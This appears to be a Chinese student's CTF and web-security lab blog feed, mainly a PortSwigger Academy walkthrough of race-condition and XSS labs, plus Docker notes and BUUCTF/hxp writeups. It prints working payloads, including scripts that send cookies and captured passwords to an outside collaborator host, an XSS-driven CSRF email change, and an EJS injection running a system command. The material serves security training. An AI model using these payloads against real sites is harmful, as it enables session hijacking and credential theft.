···<br></code></pre></td></tr></table></figure><p>存在逻辑漏洞可使用条件竞争<br>官方脚本配合攻击器使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">queueRequests</span>(<span class="hljs-params">target, wordlists</span>):<br>    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=<span class="hljs-number">10</span>,)<br><br>    request1 = <span class="hljs-string">&#x27;&#x27;&#x27;&lt;YOUR-POST-REQUEST&gt;&#x27;&#x27;&#x27;</span><br><br>    request2 = <span class="hljs-string">&#x27;&#x27;&#x27;&lt;YOUR-GET-REQUEST&gt;&#x27;&#x27;&#x27;</span><br><br>    <span class="hljs-comment"># the &#x27;gate&#x27; argument blocks the final byte of each request until openGate is invoked</span><br>    engine.queue(request1, gate=<span class="hljs-string">&#x27;race1&#x27;</span>)<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        engine.queue(request2, gate=<span class="hljs-string">&#x27;race1&#x27;</span>)<br><br>    <span class="hljs-comment"># wait until every &#x27;race1&#x27; tagged request is ready</span><br>    <span class="hljs-comment"># then send the final byte of each request</span><br>    <span class="hljs-comment"># (this method is non-blocking, just like queue)</span><br>    engine.openGate(<span class="hljs-string">&#x27;race1&#x27;</span>)<br><br>    engine.complete(timeout=<span class="hljs-number">60</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handleResponse</span>(<span class="hljs-params">req, interesting</span>):<br>    table.add(req)<br></code></pre></td></tr></table></figure><h2 id="Cross-site-scripting"><a href="#Cross-site-scripting" class="headerlink" title="Cross-site scripting"></a>Cross-site scripting</h2><h3 id="apprentice-3"><a href="#apprentice-3" class="headerlink" title="apprentice"></a>apprentice</h3><h4 id="Reflected-XSS-into-HTML-context-with-nothing-encoded"><a href="#Reflected-XSS-into-HTML-context-with-nothing-encoded" class="headerlink" title="Reflected XSS into HTML context with nothing encoded"></a>Reflected XSS into HTML context with nothing encoded</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>直接输入搜索框即可</p><h4 id="Stored-XSS-into-HTML-context-with-nothing-encoded"><a href="#Stored-XSS-into-HTML-context-with-nothing-encoded" class="headerlink" title="Stored XSS into HTML context with nothing encoded"></a>Stored XSS into HTML context with nothing encoded</h4><p>随便点开一个帖子，把alert添加到评论里即可</p><h4 id="DOM-XSS-in-document-write-sink-using-source-location-search"><a href="#DOM-XSS-in-document-write-sink-using-source-location-search" class="headerlink" title="DOM XSS in document.write sink using source location.search"></a>DOM XSS in document.write sink using source location.search</h4><p>检测为双引号闭合</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>搜索框输入</p><h4 id="DOM-XSS-in-innerHTML-sink-using-source-location-search"><a href="#DOM-XSS-in-innerHTML-sink-using-source-location-search" class="headerlink" title="DOM XSS in innerHTML sink using source location.search"></a>DOM XSS in innerHTML sink using source location.search</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>还是搜索框</p><h4 id="DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source"><a href="#DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source" class="headerlink" title="DOM XSS in jQuery anchor href attribute sink using location.search source"></a>DOM XSS in jQuery anchor href attribute sink using location.search source</h4><p>根据题目提示注入点在submit feedback page，查看源码，获得提示注入于<code>returnPath</code>处</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">returnPath</span>=javascript:alert(document.cookie)<br></code></pre></td></tr></table></figure><h4 id="DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event"><a href="#DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event" class="headerlink" title="DOM XSS in jQuery selector sink using a hashchange event"></a>DOM XSS in jQuery selector sink using a hashchange event</h4><p>查看源码的<code>&lt;script&gt;</code>部分，需要使用题目提供的exploit server<br>在exploit server的body部分改为<code>&lt;iframe src=&quot;https://.....web-security-academy.net/#&quot; onload=&quot;this.src+=&#39;&lt;img src=x onerror=print()&gt;&#39;&quot;&gt;&lt;/iframe&gt;</code>（应该就是bot监听了），点击View exploit确认工作正常，点击Deliver to victim解决</p><h4 id="Reflected-XSS-into-attribute-with-angle-brackets-HTML-encoded"><a href="#Reflected-XSS-into-attribute-with-angle-brackets-HTML-encoded" class="headerlink" title="Reflected XSS into attribute with angle brackets HTML-encoded"></a>Reflected XSS into attribute with angle brackets HTML-encoded</h4><p>注入点在搜索框<br><code>&quot;onmouseover=&quot;alert(1)</code></p><h4 id="Stored-XSS-into-anchor-href-attribute-with-double-quotes-HTML-encoded"><a href="#Stored-XSS-into-anchor-href-attribute-with-double-quotes-HTML-encoded" class="headerlink" title="Stored XSS into anchor href attribute with double quotes HTML-encoded"></a>Stored XSS into anchor href attribute with double quotes HTML-encoded</h4><p>进入随便一个博客评论区，注入点在网址添加那<br><code>javascript:alert(1)</code></p><h4 id="Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-HTML-encoded"><a href="#Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-HTML-encoded" class="headerlink" title="Reflected XSS into a JavaScript string with angle brackets HTML encoded"></a>Reflected XSS into a JavaScript string with angle brackets HTML encoded</h4><p>注入点在搜索框<br><code>&#39;-alert(1)-&#39;</code>，对JavaScript破坏</p><h3 id="practitioner-3"><a href="#practitioner-3" class="headerlink" title="practitioner"></a>practitioner</h3><h4 id="DOM-XSS-in-document-write-sink-using-source-location-search-inside-a-select-element"><a href="#DOM-XSS-in-document-write-sink-using-source-location-search-inside-a-select-element" class="headerlink" title="DOM XSS in document.write sink using source location.search inside a select element"></a>DOM XSS in document.write sink using source location.search inside a select element</h4><p>进入商品详情页面，选择查看源码，发现存在注入点storeId</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">product?productId=1&amp;storeId=&quot;&gt;<span class="hljs-attribute">&lt;/select&gt;</span><span class="hljs-attribute">&lt;img%20src=1%20onerror=alert(1)&gt;</span><br></code></pre></td></tr></table></figure><h4 id="DOM-XSS-in-AngularJS-expression-with-angle-brackets-and-double-quotes-HTML-encoded"><a href="#DOM-XSS-in-AngularJS-expression-with-angle-brackets-and-double-quotes-HTML-encoded" class="headerlink" title="DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded"></a>DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded</h4><p>结合了模板注入，注入点在搜索框</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">$on.constructor</span>(<span class="hljs-name">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span><br></code></pre></td></tr></table></figure><h4 id="Reflected-DOM-XSS"><a href="#Reflected-DOM-XSS" class="headerlink" title="Reflected DOM XSS"></a>Reflected DOM XSS</h4><p>查看源码，注入点在搜索位，输入内容以JSON形式返回<br><code>\&quot;-alert(1)&#125;//</code></p><h4 id="Stored-DOM-XSS"><a href="#Stored-DOM-XSS" class="headerlink" title="Stored DOM XSS"></a>Stored DOM XSS</h4><p>在评论区注入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure><p>最开始的<code>&lt;&gt;</code>受到replace()的影响，替换为<code>&amp;lt</code>和<code>&amp;gt</code></p><h4 id="Reflected-XSS-into-HTML-context-with-most-tags-and-attributes-blocked"><a href="#Reflected-XSS-into-HTML-context-with-most-tags-and-attributes-blocked" class="headerlink" title="Reflected XSS into HTML context with most tags and attributes blocked"></a>Reflected XSS into HTML context with most tags and attributes blocked</h4><p>用burp不停发包检测被列入黑名单的关键字<br>在exploit server使用：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&lt;iframe src=<span class="hljs-string">&quot;https://....web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E&quot;</span> onload=this.style.width=<span class="hljs-string">&#x27;100px&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p>类似“DOM XSS in jQuery selector sink using a hashchange event”</p><h4 id="Reflected-XSS-into-HTML-context-with-all-tags-blocked-except-custom-ones"><a href="#Reflected-XSS-into-HTML-context-with-all-tags-blocked-except-custom-ones" class="headerlink" title="Reflected XSS into HTML context with all tags blocked except custom ones"></a>Reflected XSS into HTML context with all tags blocked except custom ones</h4><p>要点在于tabindex标签</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;script&gt;</span><br><span class="hljs-attribute">location</span> = &#x27;https://....web-security-academy.net/?search=%<span class="hljs-number">3</span>Cxss+id%<span class="hljs-number">3</span>Dx+onfocus%<span class="hljs-number">3</span>Dalert%<span class="hljs-number">28</span>document.cookie%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>tabindex=<span class="hljs-number">1</span>%<span class="hljs-number">3</span>E#x&#x27;;<br><span class="hljs-section">&lt;/script&gt;</span><br></code></pre></td></tr></table></figure><p>谷歌上也有用<code>&lt;iframe&gt;</code>构造的</p><h4 id="Reflected-XSS-with-some-SVG-markup-allowed"><a href="#Reflected-XSS-with-some-SVG-markup-allowed" class="headerlink" title="Reflected XSS with some SVG markup allowed"></a>Reflected XSS with some SVG markup allowed</h4><p>根据题目意思需要<code>&lt;svg&gt;</code>标签绕过<br>经过测试，<code>&lt;animatetransform&gt;</code>标签可通过且可使用js</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">animatetransform</span> <span class="hljs-attr">onbegin</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">animatetransform</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="Reflected-XSS-in-canonical-link-tag"><a href="#Reflected-XSS-in-canonical-link-tag" class="headerlink" title="Reflected XSS in canonical link tag"></a>Reflected XSS in canonical link tag</h4><p>查看原代码</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;link <span class="hljs-attribute">rel</span>=<span class="hljs-string">&quot;canonical&quot;</span> <span class="hljs-attribute">href</span>=<span class="hljs-string">&#x27;https://0add00a703ba409e80aaf851005400c9.web-security-academy.net/post?postId=3&#x27;</span>/&gt;<br></code></pre></td></tr></table></figure><p>可以用单引号拼接：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-variable">%27</span>accesskey<span class="hljs-operator">=</span><span class="hljs-variable">%27</span><span class="hljs-keyword">x</span><span class="hljs-variable">%27</span>onclick<span class="hljs-operator">=</span><span class="hljs-variable">%27</span>alert(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>accesskey提供快捷键来激活脚本</p><h4 id="Reflected-XSS-into-a-JavaScript-string-with-single-quote-and-backslash-escaped"><a href="#Reflected-XSS-into-a-JavaScript-string-with-single-quote-and-backslash-escaped" class="headerlink" title="Reflected XSS into a JavaScript string with single quote and backslash escaped"></a>Reflected XSS into a JavaScript string with single quote and backslash escaped</h4><p>注入点在搜索框</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> searchTerms = <span class="hljs-string">&#x27;1\&#x27;1&#x27;</span>;</span><br><span class="language-javascript">    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&#x27;</span>+<span class="hljs-built_in">encodeURIComponent</span>(searchTerms)+<span class="hljs-string">&#x27;&quot;&gt;&#x27;</span>);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>会转义单引号，可选择闭合标签</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-and-double-quotes-HTML-encoded-and-single-quotes-escaped"><a href="#Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-and-double-quotes-HTML-encoded-and-single-quotes-escaped" class="headerlink" title="Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped"></a>Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped</h4><p>与上一题类似</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">var</span> searchTerms = <span class="hljs-string">&#x27;i\&#x27;i&#x27;</span>;</span><br><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&#x27;</span>+<span class="hljs-built_in">encodeURIComponent</span>(searchTerms)+<span class="hljs-string">&#x27;&quot;&gt;&#x27;</span>);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>也是转义单引号</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">\&#x27;-alert(<span class="hljs-number">1</span>)<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>改为注释加入js一句话木马</p><h4 id="Stored-XSS-into-onclick-event-with-angle-brackets-and-double-quotes-HTML-encoded-and-single-quotes-and-backslash-escaped"><a href="#Stored-XSS-into-onclick-event-with-angle-brackets-and-double-quotes-HTML-encoded-and-single-quotes-and-backslash-escaped" class="headerlink" title="Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped"></a>Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped</h4><p>注入点在博客的评论区添加网页链接处<br>输入的内容会添加在<code>&lt;a&gt;</code>标签内</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://foo?<span class="hljs-symbol">&amp;apos;</span>-alert(1)-<span class="hljs-symbol">&amp;apos;</span><br></code></pre></td></tr></table></figure><h4 id="Reflected-XSS-into-a-template-literal-with-angle-brackets-single-double-quotes-backslash-and-backticks-Unicode-escaped"><a href="#Reflected-XSS-into-a-template-literal-with-angle-brackets-single-double-quotes-backslash-and-backticks-Unicode-escaped" class="headerlink" title="Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped"></a>Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped</h4><p>转义特殊字符，结合模板</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;<span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)&#125;<br></code></pre></td></tr></table></figure><h4 id="Exploiting-cross-site-scripting-to-steal-cookies"><a href="#Exploiting-cross-site-scripting-to-steal-cookies" class="headerlink" title="Exploiting cross-site scripting to steal cookies"></a>Exploiting cross-site scripting to steal cookies</h4><p>这题需要用Burp Collaborator外带获得session值</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://BURP-COLLABORATOR-SUBDOMAIN&#x27;</span>, &#123;</span><br><span class="language-javascript"><span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,</span><br><span class="language-javascript"><span class="hljs-attr">mode</span>: <span class="hljs-string">&#x27;no-cors&#x27;</span>,</span><br><span class="language-javascript"><span class="hljs-attr">body</span>:<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span></span><br><span class="language-javascript">&#125;);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>https://BURP-COLLABORATOR-SUBDOMAIN</code>在Collaborator内复制，将该脚本注入于博客评论区<br>查看Collaborator中有secret字段的返回包，复制swssion值<br>点击home并拦截修改session</p><h4 id="Exploiting-cross-site-scripting-to-capture-passwords"><a href="#Exploiting-cross-site-scripting-to-capture-passwords" class="headerlink" title="Exploiting cross-site scripting to capture passwords"></a>Exploiting cross-site scripting to capture passwords</h4><p>与上类似，需要获得密码登录</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">name</span>=username <span class="hljs-attribute">id</span>=username&gt;<br>&lt;input <span class="hljs-attribute">type</span>=password <span class="hljs-attribute">name</span>=password <span class="hljs-attribute">onchange</span>=<span class="hljs-string">&quot;if(this.value.length)fetch(&#x27;https://...&#x27;,&#123;</span><br><span class="hljs-string">method:&#x27;POST&#x27;,</span><br><span class="hljs-string">mode: &#x27;no-cors&#x27;,</span><br><span class="hljs-string">body:username.value+&#x27;:&#x27;+this.value</span><br><span class="hljs-string">&#125;);&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h4 id="Exploiting-XSS-to-perform-CSRF"><a href="#Exploiting-XSS-to-perform-CSRF" class="headerlink" title="Exploiting XSS to perform CSRF"></a>Exploiting XSS to perform CSRF</h4><p>注入点在评论区，登录后选择更改邮箱，抓包发现有个CSRF token</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();</span><br><span class="language-javascript">req.<span class="hljs-property">onload</span> = handleResponse;</span><br><span class="language-javascript">req.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;get&#x27;</span>,<span class="hljs-string">&#x27;/my-account&#x27;</span>,<span class="hljs-literal">true</span>);</span><br><span class="language-javascript">req.<span class="hljs-title function_">send</span>();</span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">handleResponse</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> token = <span class="hljs-variable language_">this</span>.<span class="hljs-property">responseText</span>.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/name=&quot;csrf&quot; value=&quot;(\w+)&quot;/</span>)[<span class="hljs-number">1</span>];</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> changeReq = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();</span><br><span class="language-javascript">    changeReq.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;post&#x27;</span>, <span class="hljs-string">&#x27;/my-account/change-email&#x27;</span>, <span class="hljs-literal">true</span>);</span><br><span class="language-javascript">    changeReq.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;csrf=&#x27;</span>+token+<span class="hljs-string">&#x27;&amp;email=test@test.com&#x27;</span>)</span><br><span class="language-javascript">&#125;;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023/04/09：docker遇到的问题与解决</title>
    <link href="/2023/04/09/4-9/"/>
    <url>/2023/04/09/4-9/</url>
    
    <content type="html"><![CDATA[<h3 id="dockerfile-1"><a href="#dockerfile-1" class="headerlink" title="dockerfile-1"></a>dockerfile-1</h3><p>以下为dockerfile</p><h4 id="docker-compose-up-d失败"><a href="#docker-compose-up-d失败" class="headerlink" title="docker-compose up -d失败"></a>docker-compose up -d失败</h4><p>百度到的解决方案一般针对[manifests 18.04]，问大佬后选择直接pull至仓库再拉取镜像，原因目前未知</p><h4 id="docker-run-之后镜像立即退出"><a href="#docker-run-之后镜像立即退出" class="headerlink" title="docker run 之后镜像立即退出"></a>docker run 之后镜像立即退出</h4><p>用网上添加 -it 以及 /bin/bash 可解决<br>百度原因有三：<br>1、docker容器运行必须有一个前台进程， 如果没有前台进程执行，容器认为空闲，就会自行退出<br>2、容器运行的命令如果不是那些一直挂起的命令（ 运行top，tail、循环等），就是会自动退出<br>3、这个是 docker 的机制问题</p><h4 id="进入网页后显示当前无法使用"><a href="#进入网页后显示当前无法使用" class="headerlink" title="进入网页后显示当前无法使用"></a>进入网页后显示当前无法使用</h4><img src="/2023/04/09/4-9/2.png" class=""><p>用命令行进入如下：</p><img src="/2023/04/09/4-9/22.png" class=""><p>目前找到的解决方法：<br>1.使用ssh（无效）<br>2.查看是否使用网络代理<br>不知道在一众复制黏贴中有没有能用的</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023/03/31：一些囫囵吞枣式的记录</title>
    <link href="/2023/04/01/3-31/"/>
    <url>/2023/04/01/3-31/</url>
    
    <content type="html"><![CDATA[<p>一些复现（？）<br>反正就是没做出来的题，在这记录一下，一些反思啥的</p><h3 id="hxp-CTF-2022-valentine"><a href="#hxp-CTF-2022-valentine" class="headerlink" title="hxp CTF 2022 - valentine"></a>hxp CTF 2022 - valentine</h3><p>这里留下一个官方wp的链接：<a href="https://hxp.io/blog/101/hxp-CTF-2022-valentine/">https://hxp.io/blog/101/hxp-CTF-2022-valentine/</a><br>纯英文导致阅读障碍，看的不是很懂，水平可怜，若有问题见谅</p><p>首先，当然是判断漏洞类型，这题的注入是&lt;% %&gt;形式，写的时候只知道这好像是模板类的注入，但是尝试后没啥收获，不知道咋入手，下面是官方解答：</p><img src="/2023/04/01/3-31/jieda.png" class=""><p>emmm没多练是这样的，记得大佬有说过多练提高速度，显然目前的水平还不足以独立的写完<br>这题要利用的似乎是一个比较新的漏洞</p><img src="/2023/04/01/3-31/kkk.png" class=""><p>在这篇wp提到了题目的来源（应该这么表达吧），似乎用了一个比较新的方式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ &lt;.- global.process.mainModule.constructor._load(`child_process`).execSync(`/readflag`).toString() .&gt;<br></code></pre></td></tr></table></figure><p>感觉是对症下药式的<br>以及我以前一直不太注意的Dockerfile也很重要:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ENV NODE_ENV=production<br></code></pre></td></tr></table></figure><p>这个环境变量会在下一步用于缓存获得flag<br>感觉很新，说实话看得云里雾里的</p><p>啊这个更详细<a href="https://maoutis.github.io/writeups/Web%20Hacking/valentine/">https://maoutis.github.io/writeups/Web%20Hacking/valentine/</a><br>这里详细地介绍了整个思路和各种尝试</p><img src="/2023/04/01/3-31/111.png" class=""><p>在得知使用了ejs模板后，这个作者发现可以使用一些别的符号代替&lt;% %&gt;，为模板注入提供了可能，就可以用&lt;. .&gt;来注入需要的模板<br>然后是靠express中的view options重写文件来传入命令？有点懵，不过view options似乎是还未更新可以利用的bug，这两个wp都利用这点</p><p>先告一段落</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023/03/18</title>
    <link href="/2023/03/19/1/"/>
    <url>/2023/03/19/1/</url>
    
    <content type="html"><![CDATA[<p>一些BUUCTF记录</p><h3 id="SecretFile"><a href="#SecretFile" class="headerlink" title="SecretFile"></a>SecretFile</h3><p>很明显是要去找flag文件</p><img src="/2023/03/19/1/secret1.png" class=""><p>刚开始面对这个界面有点懵，啥也没有，看了源码才知道把连接调得和背景色一样</p><img src="/2023/03/19/1/a2.png" class=""><p>进来是这样的<br>bp抓包返回可以看到secr3t.php文件，下面是文件内容，用php伪协议包含就行</p><img src="/2023/03/19/1/a1.png" class=""><p>感觉更像一个恶作剧<br>（是的这有点简单了但我主要想试试图片发出来啥效果()）</p><h3 id="BabySQli1"><a href="#BabySQli1" class="headerlink" title="BabySQli1"></a>BabySQli1</h3><p>源码：<a href="https://github.com/imaginiso/GXY_CTF/tree/master/Web/BabySqli">https://github.com/imaginiso/GXY_CTF/tree/master/Web/BabySqli</a><br>感觉跟CTF After Dark的一题很像（Injection Perfection应该是这个）该题要求以管理员的账号登录，但查看源码可以得知把or和一些字符屏蔽了，需要让联合查询产生虚拟数据<br>（还给密码上了md5，被这个卡了真难受）</p><h3 id="BuyFlag"><a href="#BuyFlag" class="headerlink" title="BuyFlag"></a>BuyFlag</h3><img src="/2023/03/19/1/1.png" class=""><p>源码提示如上<br>该题需要对password和money传参，绕过is_numeric()和strcmp()函数（wp说是根据php版本和取值猜出来是strcmp，看来审计要多看）根据提示，抓包中cookie中user=0要改为1，然后%20绕过is_numeric和数组绕过strcmp，跟冬令营的php很像</p><h3 id="PingPingPing"><a href="#PingPingPing" class="headerlink" title="PingPingPing"></a>PingPingPing</h3><p>这题是看别人博客时突然想去看一下时做的<br>上CSDN看一下有两个比较有印象的wp:<br><a href="https://blog.csdn.net/weixin_44348894/article/details/105352676?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167914286516800217238563%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=167914286516800217238563&amp;biz_id=0&amp;utm_medium=distribute.wap_search_result.none-task-blog-2~all~top_positive~default-1-105352676-null-null.wap_search_all_course_earnings_v1&amp;utm_term=pingpingping&amp;spm=1018.2118.3001.4187">https://blog.csdn.net/weixin_44348894/article/details/105352676?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167914286516800217238563%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=167914286516800217238563&amp;biz_id=0&amp;utm_medium=distribute.wap_search_result.none-task-blog-2~all~top_positive~default-1-105352676-null-null.wap_search_all_course_earnings_v1&amp;utm_term=pingpingping&amp;spm=1018.2118.3001.4187</a><br>这个方法用sh代替了bash，将cat flag.php用base64编码后执行<br><a href="https://blog.csdn.net/qq_45414878/article/details/109557567">https://blog.csdn.net/qq_45414878/article/details/109557567</a><br>这篇同上用sh，额外提到了cat ls或cat *直接查看当前目录所有内容，但自己试的时候用他cat 